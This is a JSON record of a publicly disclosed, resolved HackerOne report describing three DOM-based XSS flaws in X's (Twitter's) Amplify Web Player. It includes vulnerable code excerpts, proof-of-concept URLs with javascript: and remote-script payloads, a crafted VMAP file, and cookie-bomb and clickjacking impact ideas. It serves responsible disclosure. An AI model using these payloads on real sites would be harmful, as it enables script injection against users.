{
  "id": 88719,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODcxOQ==",
  "url": "https://hackerone.com/reports/88719",
  "title": "Multiple DOMXSS on Amplify Web Player",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-09-13T13:08:16.024Z",
  "submitted_at": "2015-09-13T13:08:16.024Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "filedescriptor",
    "url": "/filedescriptor",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 61,
    "url": "https://hackerone.com/x",
    "handle": "x",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "X (Formerly Twitter)",
      "twitter_handle": "XSecurity",
      "website": "https://x.com",
      "about": "X helps you create and share ideas and information instantly, without barriers."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-04-15T08:27:59.074Z",
  "bug_reporter_agreed_on_going_public_at": "2017-03-16T08:27:50.825Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi,\r\nI would like to report multiple DOMXSS issues on https://amp.twimg.com/amplify-web-player/prod/source.html.\r\n\r\n##Details:\r\n\r\n> Please use latest IE to open all the PoCs because of CSP\r\n\r\n##1. ```$.get``` sink\r\n\r\n```javascript\r\ndefine(\"data/playlist/with_json_loader\", [\"require\", \"flight/lib/compose\", \"data/playlist/with_json_parser\"], function(e) {\r\n    function r() {\r\n        t.mixin(this, [n]),\r\n        this.loadJson = function(e) {\r\n            return $.get(e).then(this.parseJson.bind(this))\r\n-----------------------^^\r\n```\r\n\r\nIt is dangerous to use jQuery's ajax function without specifying the expected data type. Attacker can supply a remote js file to achieve XSS. This can be addressed by specifying the data type to be JSON. [Ref](https://github.com/jquery/jquery/issues/2432).\r\n\r\n**PoC**: https://amp.twimg.com/amplify-web-player/prod/source.html?url=https://innerht.ml/vectors/js.php\r\nAfter clicking the play button, an alert will be popped up.\r\n\r\n##2. Lack of URL validation on ```playerUrl```\r\n\r\n```javascript\r\ndefine(\"ui/playback/vine_display\", [\"require\", \"flight/lib/component\"], function(e) {\r\n    function n() {\r\n        this.attributes({\r\n            playerUrl: undefined\r\n        }),\r\n        this.$frame = undefined,\r\n        this.loadVideo = function() {\r\n            if (!this.attr.playerUrl)\r\n                return;\r\n            this.$frame = $('<iframe id=\"vine-frame\" frameborder=\"0\" scrolling=\"no\" allowtransparency=\"true\"></iframe>'),\r\n            this.$frame.attr(\"src\", this.attr.playerUrl),\r\n-----------------------------------------------^^\r\n```\r\n\r\nWhen the source type is Vine, the player will try to inject an iframe with user-supplied parameter ```player_url```. Attacker can make it a ```javascript:``` attacker vector. Proper fix would be to validate if the URL starts with http(s). \r\n\r\n**PoC**: https://amp.twimg.com/amplify-web-player/prod/source.html?player_url=javascript:alert(1)&source_type=vine\r\nAfter clicking the play button, an alert will be popped up.\r\n\r\n##3. Lack of URL validation on ```ctaLink```\r\n\r\n```javascript\r\n        this.updateCallToAction = function(e, t) {\r\n            var i = this.select(\"textNodeSelector\");\r\n            i.html(\"\");\r\n            if (t && t.url && t.type) {\r\n                this.id = t.id,\r\n                this.type = t.type,\r\n                this.ctaLink = t.url;\r\n                var s, o = n.getUrlMetadata(this.ctaLink), u = o.hostname;\r\n                u.indexOf(\"www.\") === 0 && (u = u.substr(4)),\r\n                t.type === \"visit\" ? s = r(\"Visit %{hostname}\", {\r\n                    hostname: u\r\n                }) : s = r(\"Watch now at %{hostname}\", {\r\n                    hostname: u\r\n                });\r\n                var a = $(\"<a target='_blank'></a>\");\r\n                a.attr(\"href\", this.ctaLink),\r\n--------------------------------------^^\r\n```\r\n\r\nWhen loading a vmap file, the player will inject an anchor referencing ```tw:cta_open_url```. Attacker can supply a remote vmap file with crafted ```tw:cta_open_url``` value (e.g. ```javascript:```) to perform XSS. Such file would be like this:\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n\r\n<vmap:VMAP xmlns:tw=\"http://twitter.com/schema/videoVMapV2.xsd\"\r\n           xmlns:vmap=\"http://www.iab.net/vmap-1.0\"\r\n           xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n           xmlns:esi=\"http://www.edge-delivery.org/esi/1.0\"\r\n           xsi:noNamespaceSchemaLocation=\"vast3.xsd\">\r\n  <vmap:Extensions>\r\n    <vmap:Extension>\r\n      <tw:amplify>\r\n        <tw:content ownerId=\"915643998\" contentId=\"fce6b1eb-b250-437f-9e68-2e9e5813a6d7\" stitched=\"false\">\r\n\r\n      <tw:cta_open_url url=\"javascript:alert(1)\" />\r\n\r\n          <MediaFiles>\r\n            <MediaFile>\r\n              <![CDATA[http://amp.twimg.com/prod/multibr_v_1/video/2015/03/26/16/0f41c544-uploadedvideo-libx264-main-2028k.mp4?9gOtbn78IXQ3XYKMMntL6URZZjLVfwxgCGtkHlrJ1CY%3D]]>\r\n            </MediaFile>\r\n          </MediaFiles>\r\n        </tw:content>\r\n      </tw:amplify>\r\n    </vmap:Extension>\r\n  </vmap:Extensions>\r\n</vmap:VMAP>\r\n```\r\nI don't have PoC for this one because the vmap file needs to be hosted on a white-listed domain, but it is still a potential attack.\r\n\r\n#Impact\r\nNow, one may wonder how these XSSes can affect users. There are at least two ways I can think of:\r\n\r\n#1. Denial of Service\r\nThe domain ```*.twimg.com``` is used to store various static files all over Twitter. Attacker can use Cookie Bomb attack to effectively make users unable to access them, hence breaking a lot of things when users browser Twitter.\r\n\r\n#2. Clickjacking\r\nAmplify Web Players usually appear in user's timeline. As they are embedded in iframe, attacker can use XSS to change the player's URL. Combining the flaw of ```X-Frame-Options: SAMEORIGIN```, attacker can conduct a clickjacking attack with some user interactions. This is a bit tricky to explain so I guess you can watch the video demo to get some ideas.\r\n\r\n**PoC**: http://innerht.ml/pocs/twitter-amp-xss/\r\nAfter clicking the button, a new window will be opened. Wait a few seconds and click the amplify player. After that the opener page will be changed to a Tweet and the original amplify player will become an attacker controlled page which contains clickjacking attack.\r\n\r\n**Video Demo**: https://vimeo.com/139118917 (password: xfo)\r\n\r\n",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-04-15T08:27:50.857Z",
  "allow_singular_disclosure_after": -215579878.42193627,
  "singular_disclosure_allowed": true,
  "vote_count": 66,
  "voters": [
    "zoom7",
    "delimitry",
    "sw33tlie",
    "arneswinnen",
    "bogdantcaciuc",
    "kapytein",
    "bobrov",
    "michiel",
    "orange",
    "spam404",
    "and 56 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
